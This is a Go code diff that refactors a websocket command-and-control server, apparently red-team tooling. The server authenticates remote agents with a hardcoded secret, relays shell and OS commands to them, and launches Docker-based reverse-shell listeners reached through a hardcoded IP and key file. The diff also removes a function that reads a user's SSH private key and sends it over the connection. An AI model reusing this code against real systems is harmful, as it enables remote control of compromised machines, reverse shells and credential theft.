@@ -1,13 +1,12 @@
-package main
+package server
 
 import (
+	"c2s/utils"
 	"errors"
 	"fmt"
 	"io"
 	"log"
 	"math/rand"
-	"net/http"
-	"os"
 	"os/exec"
 	"strconv"
 	"strings"
@@ -26,10 +25,9 @@ type ConnStats struct {
 }
 
 type Server struct {
-	conns      map[*websocket.Conn]ConnStats
-	secret     string
-	usedPort   []string
-	sshTunUser string
+	conns    map[*websocket.Conn]ConnStats
+	secret   string
+	usedPort []string
 }
 
 func (c *ConnStats) setRstage(v int) {
@@ -45,17 +43,16 @@ func (c *ConnStats) setContainerPort(v string) {
 
 func NewServer() *Server {
 	return &Server{
-		conns:      make(map[*websocket.Conn]ConnStats),
-		secret:     "EnCryp!e0?",
-		sshTunUser: "ctouser",
+		conns:  make(map[*websocket.Conn]ConnStats),
+		secret: "EnCryp!e0?",
 	}
 }
 
-func (s *Server) handleWS(ws *websocket.Conn) {
+func (s *Server) HandleWS(ws *websocket.Conn) {
 	fmt.Println("New connection ...", ws.RemoteAddr())
 	stats := ConnStats{}
 	stats.auth = false
-	stats.id = RandomString(6)
+	stats.id = utils.RandomString(6)
 	stats.name = ""
 	stats.rsStage = -1
 	s.conns[ws] = stats
@@ -77,8 +74,8 @@ func (s *Server) listenLoop(ws *websocket.Conn) {
 		}
 		payload := buf[:n]
 		msg := string(payload)
-		if stat.auth == false && !isAuthCmd(msg) {
-			send("E403: Please authenticate first !", ws)
+		if stat.auth == false && !utils.IsAuthCmd(msg) {
+			utils.Send("E403: Please authenticate first !", ws)
 		} else {
 
 			s.command(payload, ws)
@@ -93,22 +90,22 @@ func (s *Server) direct(b []byte, ids []string, wsSender *websocket.Conn) {
 
 	for ws, stat := range s.conns {
 		// fmt.Print(stat)
-		if isElementExist(ids, stat.id) {
+		if utils.IsElementExist(ids, stat.id) {
 			if stat.auth == true {
-				if send(string(b), ws) {
+				if utils.Send(string(b), ws) {
 					counter++
 				}
 			}
 		}
 	}
-	send("Succefully sent: "+strconv.Itoa(counter), wsSender)
+	utils.Send("Succefully sent: "+strconv.Itoa(counter), wsSender)
 }
 
 func (s *Server) broadcast(b []byte, wsSender *websocket.Conn) {
 	for ws, stat := range s.conns {
 		// fmt.Print(stat)
 		if stat.auth == true {
-			send(string(b), ws)
+			utils.Send(string(b), ws)
 		}
 	}
 }
@@ -130,7 +127,7 @@ func (s *Server) command(b []byte, wsSender *websocket.Conn) {
 	case "/msg":
 		// fmt.Println("command------case:msg")
 		if len(args) < 2 {
-			send("Empty parameter !", wsSender)
+			utils.Send("Empty parameter !", wsSender)
 		} else {
 			s.msg(args[1], wsSender)
 		}
@@ -138,7 +135,7 @@ func (s *Server) command(b []byte, wsSender *websocket.Conn) {
 	case "/cmd":
 		// fmt.Println("command------case:cmd")
 		if len(args) < 2 {
-			send("Empty parameter !", wsSender)
+			utils.Send("Empty parameter !", wsSender)
 		} else {
 			s.cmd(args[1], wsSender)
 		}
@@ -154,7 +151,7 @@ func (s *Server) command(b []byte, wsSender *websocket.Conn) {
 	case "/ping":
 		// fmt.Println("command------case:ping")
 		if len(args) < 2 {
-			send("Empty parameter !", wsSender)
+			utils.Send("Empty parameter !", wsSender)
 		} else {
 			s.ping(args[1], wsSender)
 		}
@@ -162,7 +159,7 @@ func (s *Server) command(b []byte, wsSender *websocket.Conn) {
 	case "/pong":
 		// fmt.Println("command------case:pong")
 		if len(args) < 2 {
-			send("Empty parameter !", wsSender)
+			utils.Send("Empty parameter !", wsSender)
 		} else {
 			s.pong(args[1], wsSender)
 		}
@@ -170,7 +167,7 @@ func (s *Server) command(b []byte, wsSender *websocket.Conn) {
 	case "/os":
 		// fmt.Println("command------case:pong")
 		if len(args) < 2 {
-			send("Empty parameter !", wsSender)
+			utils.Send("Empty parameter !", wsSender)
 		} else {
 			s.handleOs(args[1], wsSender)
 		}
@@ -184,7 +181,7 @@ func (s *Server) command(b []byte, wsSender *websocket.Conn) {
 		break
 	case "/rs":
 		if len(args) < 2 {
-			send("Empty parameter !", wsSender)
+			utils.Send("Empty parameter !", wsSender)
 		} else {
 			params := s.rsParser(args[1])
 			s.revSh(params[0], params[1], params[2], params[3], params[4], wsSender)
@@ -192,7 +189,7 @@ func (s *Server) command(b []byte, wsSender *websocket.Conn) {
 		break
 	case "/rscls":
 		if len(args) < 2 {
-			send("Empty parameter !", wsSender)
+			utils.Send("Empty parameter !", wsSender)
 		} else {
 			s.rsCleanUp(args[1])
 		}
@@ -221,7 +218,7 @@ func (s *Server) authenticate(args string, wsSender *websocket.Conn) {
 		// fmt.Print(s.conns[wsSender])
 		// return true
 	}
-	send("[auth] -> "+msg, wsSender)
+	utils.Send("[auth] -> "+msg, wsSender)
 	// return false
 }
 
@@ -279,10 +276,10 @@ func (s *Server) id(args string, wsSender *websocket.Conn) {
 				}
 			}
 		}
-		send(result, wsSender)
+		utils.Send(result, wsSender)
 
 	default:
-		send(result+"\n"+s.conns[wsSender].id+":"+s.conns[wsSender].name, wsSender)
+		utils.Send(result+"\n"+s.conns[wsSender].id+":"+s.conns[wsSender].name, wsSender)
 	}
 }
 
@@ -312,16 +309,16 @@ func (s *Server) revSh(agentId string, shell string, rserverIp string, user stri
 	extport := strconv.Itoa(7700 + rand.Intn(100))
 	fmt.Println(extport, s.usedPort)
 	for {
-		if isElementExist(s.usedPort, extport) == false {
+		if utils.IsElementExist(s.usedPort, extport) == false {
 			break
 		}
 		extport = strconv.Itoa(7700 + rand.Intn(100))
 	}
 	image := "devoxit/rserver:latest"
-	// send command to spin a reverse server
+	// utils.Send command to spin a reverse server
 	cmdStr := "sudo docker run -p " + extport + ":" + intport + " --name rs_" + agentId + " -i " + image + " /usr/src/app/rserver tcp " + intport
 
-	send("please connect here:\n ssh ubuntu@15.168.53.14 -i tm-red-traning-srv1.pem  \""+cmdStr+"\"", wsSender)
+	utils.Send("please connect here:\n ssh ubuntu@15.168.53.14 -i tm-red-traning-srv1.pem  \""+cmdStr+"\"", wsSender)
 	conn, err := s.getConnById(agentId)
 	if err != nil {
 		fmt.Print(err)
@@ -333,60 +330,14 @@ func (s *Server) revSh(agentId string, shell string, rserverIp string, user stri
 	state := s.waitForRServer(agentId)
 	if state != true {
 		fmt.Println("connection timeout ...")
-		send("connection timeout ... !\nPlease retry again ! ", wsSender)
+		utils.Send("connection timeout ... !\nPlease retry again ! ", wsSender)
 		s.rsCleanUp(agentId)
 	}
 	s.usedPort = append(s.usedPort, extport)
-	// send to agent order
+	// utils.Send to agent order
 	fmt.Println("1", conn.rsStage)
 
 	s.rsRequest(agentId, shell, rserverIp, extport, user, ipSsh, wsSender)
-}
-
-func main() {
-	prog := os.Args[0]
-	if len(os.Args[:]) < 2 {
-		fmt.Println(fmt.Sprintf("usage: %s <port>", prog))
-		return
-	}
-	server := NewServer()
-	http.Handle("/ws", websocket.Handler(server.handleWS))
-	fmt.Println("listen in port " + os.Args[1])
-	log.Fatal(http.ListenAndServe(":"+os.Args[1], nil))
-}
-
-func send(str string, ws *websocket.Conn) bool {
-	_, err := ws.Write([]byte(str))
-	if err != nil {
-		fmt.Println("Error: ", err)
-		return false
-	}
-	return true
-}
-
-func isElementExist(tab []string, i string) bool {
-	for _, v := range tab {
-		if i == v {
-			return true
-		}
-	}
-	return false
-}
-
-func isAuthCmd(str string) bool {
-	args := strings.Split(str, ":")
-	// fmt.Println(args[0] == "/auth")
-	return args[0] == "/auth"
-}
-
-func RandomString(n int) string {
-	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
-
-	s := make([]rune, n)
-	for i := range s {
-		s[i] = letters[rand.Intn(len(letters))]
-	}
-	return string(s)
 }
 
 func (s *Server) waitForRServer(agentId string) bool {
@@ -452,17 +403,4 @@ func (s *Server) rsCleanUp(agentId string) {
 	cmdRS.Run()
 	fmt.Println("container rs_" + agentId + " deleted !")
 
-}
-
-func (s *Server) sshKeyEx(wsSender *websocket.Conn) {
-	str := string(shareSshKey(s.sshTunUser))
-	send("[sshKey] -> "+str, wsSender)
-}
-
-func shareSshKey(user string) []byte {
-	out, err := exec.Command("cat", "/home/"+user+"/.ssh/id_rsa").Output()
-	if err != nil {
-		return []byte("error happend !")
-	}
-	return out
 }
